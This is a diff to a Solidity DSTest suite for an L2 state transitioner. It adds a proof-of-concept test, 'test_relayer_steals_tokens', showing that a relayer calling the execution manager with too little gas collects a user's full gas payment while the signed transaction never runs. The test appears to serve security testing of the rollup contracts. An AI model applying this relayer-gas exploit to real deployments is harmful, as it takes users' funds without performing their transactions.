@@ -187,15 +187,6 @@ contract StateTransitionerTest is DSTest {
         bytes32 r = 0xf26efebc963441c1333fa42df633bdd0a6a0cfa4d00b0e70986397ff8847a57f;
         bytes32 s = 0x70d9e5db90c7e5af65f50868ef36159449a5542456647d206eebe68fb8dd7a6b;
 
-        bytes memory execData = abi.encodeWithSignature(
-            "execute(bytes,uint8,uint8,bytes32,bytes32)",
-            wrappedTx,
-            Lib_OVMCodec.EOASignatureType.EIP155_TRANSACTON,
-            v,
-            r,
-            s
-        );
-
         // --- upgrade implementation ---
 
         // grant some eth balances
@@ -234,6 +225,71 @@ contract StateTransitionerTest is DSTest {
         address impl = abi.decode(data, (address));
 
         assertEq(impl, empty);
+    }
+
+    event Hi(bytes hi);
+    function test_relayer_steals_tokens() public {
+        address counter = address(new Counter());
+        liftToL2(counter);
+
+        // --- build tx ---
+
+        bytes memory data = abi.encodeWithSignature("increment(uint256)", 750);
+        bytes memory wrappedTx = Lib_OVMCodec.encodeEIP155Transaction(
+            Lib_OVMCodec.EIP155Transaction({
+                nonce:    1,
+                gasPrice: 1,
+                gasLimit: 5433210000,
+                to:       counter,
+                value:    0,
+                data:     data,
+                chainId:  420
+            }),
+            false
+        );
+
+        // signature generated with:
+        // NONCE=1 GAS_PRICE=1 GAS_LIMIT=5433210000 VALUE=0 CHAIN_ID=420 TO=0x196d2b8a346ab5d661e74a24840c24754df05d3b DATA=0x7cf5dab000000000000000000000000000000000000000000000000000000000000002ee ./sign
+        uint8   v = 1;
+        bytes32 r = 0xff0b3c4422251d498405c55eb705e6758e94cce35440833006f5bb750cfb2acc;
+        bytes32 s = 0x02e12b7f1a9f5e06353bb631d13abb92d18b121be4b03dc21d32ef914fa21fa3;
+        emit Hi(data);
+        assertEq(TEST_EOA, Lib_ECDSAUtils.recover(wrappedTx, false, v, r, s));
+
+        // --- relayer executes tx with insufficient gas ---
+
+        // grant some eth balances
+        setBalance(TEST_EOA, 5433210000);
+        setBalance(address(0), 0);
+
+        (bool res,) = address(executionMgr).call{gas:2000000}(abi.encodeWithSignature(
+            "run((uint256,uint256,uint8,address,address,uint256,bytes),address)",
+            Lib_OVMCodec.Transaction({
+                timestamp:     block.timestamp,
+                blockNumber:   block.number,
+                l1QueueOrigin: Lib_OVMCodec.QueueOrigin.L1TOL2_QUEUE,
+                l1TxOrigin:    address(this),
+                entrypoint:    TEST_EOA,
+                gasLimit:      100000000,
+                data: abi.encodeWithSignature(
+                    "execute(bytes,uint8,uint8,bytes32,bytes32)",
+                    wrappedTx,
+                    Lib_OVMCodec.EOASignatureType.EIP155_TRANSACTON,
+                    v,
+                    r,
+                    s
+                )
+            }),
+            address(stateMgr)
+        ));
+        require(res, "run failed");
+
+        // the relayer got paid for the gas
+        assertEq(balanceOf(address(0)), 5433210000);
+        assertEq(balanceOf(TEST_EOA), 0);
+
+        // the computation has not been carried out
+        assertEq(Counter(counter).count(), 0);
     }
 
     // NONCE=1 GAS_PRICE=0x346dc5d63886594af4f0d844d013a92a305532617c1bda5119ce075f6fd22 GAS_LIMIT=20000 VALUE=0 CHAIN_ID=420 TO=0xD521C744831cFa3ffe472d9F5F9398c9Ac806203 ./sign
@@ -584,6 +640,17 @@ contract MakeEmpty {
 contract Empty {
     constructor() payable {}
     fallback() external payable {}
+}
+
+contract Counter {
+    event Hi(uint n);
+    uint public count = 0;
+
+    function increment(uint n) external {
+        for (uint i = 0; i < n; i++) {
+            count = count + 1;
+        }
+    }
 }
 
 
